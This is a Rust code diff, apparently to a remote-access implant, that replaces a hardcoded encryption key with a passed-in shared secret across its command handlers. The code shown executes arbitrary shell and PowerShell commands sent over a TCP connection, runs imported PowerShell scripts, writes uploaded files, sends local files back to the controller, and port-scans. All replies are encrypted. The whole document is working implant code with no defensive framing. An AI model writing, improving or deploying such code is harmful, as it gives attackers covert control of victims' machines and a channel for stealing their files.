@@ -23,6 +23,7 @@ pub fn handle_import_psh(
     stream: &mut TcpStream,
     _command: &str,
     imported_scripts: &mut HashMap<String, ImportedScript>,
+    shared_secret: &[u8; 32]
 ) -> Result<(), Box<dyn Error>> {
     let mut buffer = [0; 65535];
     let mut encoded_data = String::new();
@@ -31,7 +32,7 @@ pub fn handle_import_psh(
 
     loop {
         let _ = stream.read(&mut buffer)?;
-        let data = String::from_utf8(decrypt(&buffer, b"shared secret")?)?;
+        let data = String::from_utf8(decrypt(&buffer, shared_secret)?)?;
         encoded_data.push_str(&data);
         if data.contains("|!!done!!|") {
             break;
@@ -63,7 +64,7 @@ pub fn handle_import_psh(
 
     for function_name in function_names {
         let success_msg = format!("Successfully imported {}\n", function_name);
-        let encrypted_data = encrypt(success_msg.as_bytes(), b"shared secret")?;
+        let encrypted_data = encrypt(success_msg.as_bytes(), shared_secret)?;
         stream.write(&encrypted_data)?;
     }
     stream.flush()?;
@@ -75,6 +76,7 @@ pub fn handle_run_script(
     stream: &mut TcpStream,
     command: &str,
     imported_scripts: &HashMap<String, ImportedScript>,
+    shared_secret: &[u8; 32]
 ) {
     let parts: Vec<&str> = command.splitn(3, ' ').collect();
     let function_name = parts[1].trim();
@@ -99,7 +101,7 @@ pub fn handle_run_script(
             Err(e) => {
                 let error_message = format!("Error executing PowerShell command: {}||cmd||", e);
                 let encrypted_data =
-                    encrypt(error_message.as_bytes(), b"shared secret").expect("Failed to encrypt");
+                    encrypt(error_message.as_bytes(), shared_secret).expect("Failed to encrypt");
                 stream
                     .write(&encrypted_data)
                     .expect("Error writing to stream");
@@ -111,7 +113,7 @@ pub fn handle_run_script(
         let stderr = String::from_utf8_lossy(&output.stderr);
         let combined_output = format!("{}\r\n{}\r\n||cmd||", stdout, stderr);
         let encrypted_data =
-            encrypt(combined_output.as_bytes(), b"shared secret").expect("Failed to encrypt");
+            encrypt(combined_output.as_bytes(), shared_secret).expect("Failed to encrypt");
         stream
             .write(&encrypted_data)
             .expect("Error writing to stream");
@@ -135,7 +137,7 @@ pub fn handle_run_script(
             available_functions_str
         );
         let encrypted_data =
-            encrypt(error_message.as_bytes(), b"shared secret").expect("Failed to encrypt");
+            encrypt(error_message.as_bytes(), shared_secret).expect("Failed to encrypt");
         stream
             .write(&encrypted_data)
             .expect("Error writing to stream");
@@ -143,7 +145,7 @@ pub fn handle_run_script(
     }
 }
 
-pub fn handle_upload(stream: &mut TcpStream, command: &str) -> Result<(), Box<dyn Error>> {
+pub fn handle_upload(stream: &mut TcpStream, command: &str, shared_secret: &[u8; 32]) -> Result<(), Box<dyn Error>> {
     let parts: Vec<&str> = command.split(" ").collect();
     let destination = parts[1];
     let mut file = File::create(destination)?;
@@ -152,7 +154,7 @@ pub fn handle_upload(stream: &mut TcpStream, command: &str) -> Result<(), Box<dy
     let mut encoded_data = String::new();
     loop {
         let _ = stream.read(&mut buffer)?;
-        let data = String::from_utf8(decrypt(&buffer, b"shared secret")?)?;
+        let data = String::from_utf8(decrypt(&buffer, shared_secret)?)?;
         encoded_data.push_str(&data);
         if data.contains("|!!done!!|") {
             break;
@@ -165,19 +167,19 @@ pub fn handle_upload(stream: &mut TcpStream, command: &str) -> Result<(), Box<dy
     let decoded_data = general_purpose::STANDARD.decode(&encoded_data)?;
     file.write_all(&decoded_data)?;
     let response_string = format!("UPLOAD: File saved to {}.", destination);
-    let encrypted_data = encrypt(response_string.as_bytes(), b"shared secret")?;
+    let encrypted_data = encrypt(response_string.as_bytes(), shared_secret)?;
     stream.write(&encrypted_data)?;
     Ok(())
 }
 
-pub fn handle_download(stream: &mut TcpStream, command: &str) {
+pub fn handle_download(stream: &mut TcpStream, command: &str, shared_secret: &[u8; 32]) {
     let parts: Vec<&str> = command.split(" ").collect();
     let file_name = parts[1];
     let file = match File::open(file_name) {
         Ok(file) => file,
         Err(_) => {
             let encrypted_msg =
-                encrypt(b"File not found", b"shared secret").expect("Failed to encrypt");
+                encrypt(b"File not found", shared_secret).expect("Failed to encrypt");
             stream
                 .write(&encrypted_msg)
                 .expect("Error writing to stream");
@@ -193,13 +195,13 @@ pub fn handle_download(stream: &mut TcpStream, command: &str) {
     let combined_output = format!("{} |!!done!!|", encodedfile);
     
     for chunk in combined_output.as_bytes().chunks(956) {
-        let encrypted_data = encrypt(chunk, b"shared secret").expect("Failed to encrypt");
+        let encrypted_data = encrypt(chunk, shared_secret).expect("Failed to encrypt");
         stream.write(&encrypted_data).expect("Error writing to stream");
     }
     stream.flush().unwrap();
 }
 
-pub fn handle_cmd(stream: &mut TcpStream, command: &str, os: String) {
+pub fn handle_cmd(stream: &mut TcpStream, command: &str, os: String, shared_secret: &[u8; 32]) {
     let parts: Vec<&str> = command.splitn(2, "||CMDEXEC|| ").collect();
     let command = parts[1];
     let output: std::process::Output;
@@ -222,14 +224,14 @@ pub fn handle_cmd(stream: &mut TcpStream, command: &str, os: String) {
     let combined_output = format!("{}{}||cmd||\r\n", stdout, stderr);
 
     let encrypted_data =
-        encrypt(combined_output.as_bytes(), b"shared secret").expect("Failed to encrypt");
+        encrypt(combined_output.as_bytes(), shared_secret).expect("Failed to encrypt");
     stream
         .write(&encrypted_data)
         .expect("Error writing to stream");
     stream.flush().expect("Error flushing stream");
 }
 
-pub fn handle_psh(stream: &mut TcpStream, command: &str) {
+pub fn handle_psh(stream: &mut TcpStream, command: &str, shared_secret: &[u8; 32]) {
     let parts: Vec<&str> = command.splitn(2, "||PSHEXEC|| ").collect();
     let command = parts[1];
     let output = std::process::Command::new("powershell")
@@ -243,14 +245,14 @@ pub fn handle_psh(stream: &mut TcpStream, command: &str) {
     let combined_output = format!("{}{}||cmd||\r\n", stdout, stderr);
 
     let encrypted_data =
-        encrypt(combined_output.as_bytes(), b"shared secret").expect("Failed to encrypt");
+        encrypt(combined_output.as_bytes(), shared_secret).expect("Failed to encrypt");
     stream
         .write(&encrypted_data)
         .expect("Error writing to stream");
     stream.flush().expect("Error flushing stream");
 }
 
-pub fn handle_portscan(stream: &mut TcpStream, command: &str) {
+pub fn handle_portscan(stream: &mut TcpStream, command: &str, shared_secret: &[u8; 32]) {
     let parts: Vec<&str> = command.split(" ").collect();
     let ip = parts[1];
     let num1_str = parts[2].trim();
@@ -259,7 +261,7 @@ pub fn handle_portscan(stream: &mut TcpStream, command: &str) {
         Err(err) => {
             let err = encrypt(
                 format!("Error parsing number: {}", err).as_bytes(),
-                b"shared secret",
+                shared_secret,
             )
             .expect("Failed to encrypt");
             stream.write(&err).expect("Error writing to stream");
@@ -272,7 +274,7 @@ pub fn handle_portscan(stream: &mut TcpStream, command: &str) {
         Err(err) => {
             let err = encrypt(
                 format!("Error parsing number: {}", err).as_bytes(),
-                b"shared secret",
+                shared_secret,
             )
             .expect("Failed to encrypt");
             stream.write(&err).expect("Error writing to stream");
@@ -287,7 +289,7 @@ pub fn handle_portscan(stream: &mut TcpStream, command: &str) {
         .map(|addr| addr.to_string().as_bytes().to_owned())
         .collect::<Vec<Vec<u8>>>()
         .concat();
-    let encrypted_data = encrypt(my_addrs_slice, b"shared secret").expect("Failed to encrypt");
+    let encrypted_data = encrypt(my_addrs_slice, shared_secret).expect("Failed to encrypt");
     stream
         .write(&encrypted_data)
         .expect("Error writing to stream");
